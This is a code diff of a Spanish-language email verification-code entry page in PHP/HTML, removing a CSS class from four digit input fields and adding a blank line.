@@ -41,6 +41,7 @@ echo $header;
                                                 </svg>
                                             </div>
                                         </div>
+                                        
                                         <div class="text-center text-muted mb-2">
                                             <h5>Ingresa tu código de verificación</h5>
                                             <span class="text-muted text-sm">Has recibido un código de verificación de identidad en tu cuenta de correo electrónico, introdúcelo a continuación. </span>
@@ -53,22 +54,22 @@ echo $header;
                                             <div class="row gx-2 gx-sm-3">
                                                 <div class="col">
                                                     <div class="form-group">
-                                                        <input style="font-size: 25px" type="text" id="uno" name="uno" class="form-control form-control-lg text-center press" maxlength="1" autocomplete="off" autocapitalize="off" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">
+                                                        <input style="font-size: 25px" type="text" id="uno" name="uno" class="form-control form-control-lg text-center" maxlength="1" autocomplete="off" autocapitalize="off" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">
                                                     </div>
                                                 </div>
                                                 <div class="col">
                                                     <div class="form-group">
-                                                        <input style="font-size: 25px" type="text" id="dos" name="dos" class="form-control form-control-lg text-center press" maxlength="1" autocomplete="off" autocapitalize="off" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">
+                                                        <input style="font-size: 25px" type="text" id="dos" name="dos" class="form-control form-control-lg text-center" maxlength="1" autocomplete="off" autocapitalize="off" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">
                                                     </div>
                                                 </div>
                                                 <div class="col">
                                                     <div class="form-group">
-                                                        <input style="font-size: 25px" type="text" id="tres" name="tres" class="form-control form-control-lg text-center press" maxlength="1" autocomplete="off" autocapitalize="off" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">
+                                                        <input style="font-size: 25px" type="text" id="tres" name="tres" class="form-control form-control-lg text-center" maxlength="1" autocomplete="off" autocapitalize="off" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">
                                                     </div>
                                                 </div>
                                                 <div class="col">
                                                     <div class="form-group">
-                                                        <input style="font-size: 25px" type="text" id="cuatro" name="cuatro" class="form-control form-control-lg text-center press" maxlength="1" autocomplete="off" autocapitalize="off" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">
+                                                        <input style="font-size: 25px" type="text" id="cuatro" name="cuatro" class="form-control form-control-lg text-center" maxlength="1" autocomplete="off" autocapitalize="off" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;">
                                                     </div>
                                                 </div>
                                             </div>
